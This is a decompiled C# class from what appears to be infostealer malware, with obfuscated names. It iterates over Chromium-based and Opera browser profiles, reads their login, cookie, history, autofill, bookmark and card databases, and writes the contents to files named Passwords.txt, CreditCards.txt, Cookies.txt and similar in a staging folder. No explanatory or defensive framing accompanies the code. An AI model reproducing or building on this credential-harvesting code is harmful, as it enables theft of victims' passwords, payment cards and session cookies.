using System.Collections.Generic;
using System.IO;
using ns13;
using ns8;

namespace ns12;

internal sealed class Class47
{
	public static void smethod_0(string string_0)
	{
		if (!Directory.Exists(string_0))
		{
			Directory.CreateDirectory(string_0);
		}
		string[] string_ = Class55.string_0;
		foreach (string text in string_)
		{
			string path = ((!text.Contains("Opera Software")) ? (Class55.string_4 + text) : (Class55.string_3 + text));
			if (Directory.Exists(path))
			{
				string[] directories = Directory.GetDirectories(path);
				foreach (string obj in directories)
				{
					string text2 = string_0 + "\\" + Class46.smethod_5(text);
					Directory.CreateDirectory(text2);
					List<Struct3> list_ = Class49.smethod_0(obj + "\\Web Data");
					List<GStruct10> list_2 = Class52.smethod_0(obj + "\\Login Data");
					List<Struct2> list_3 = Class48.smethod_0(obj + "\\Cookies");
					List<Struct5> list_4 = Class51.smethod_0(obj + "\\History");
					List<Struct5> list_5 = Class50.smethod_0(obj + "\\History");
					List<Struct4> list_6 = Class43.smethod_0(obj + "\\Web Data");
					List<Struct6> list_7 = Class45.smethod_0(obj + "\\Bookmarks");
					Class30.smethod_11(list_, text2 + "\\CreditCards.txt");
					Class30.smethod_10(list_2, text2 + "\\Passwords.txt");
					Class30.smethod_6(list_3, text2 + "\\Cookies.txt");
					Class30.smethod_8(list_4, text2 + "\\History.txt");
					Class30.smethod_8(list_5, text2 + "\\Downloads.txt");
					Class30.smethod_7(list_6, text2 + "\\AutoFill.txt");
					Class30.smethod_9(list_7, text2 + "\\Bookmarks.txt");
				}
			}
		}
	}
}
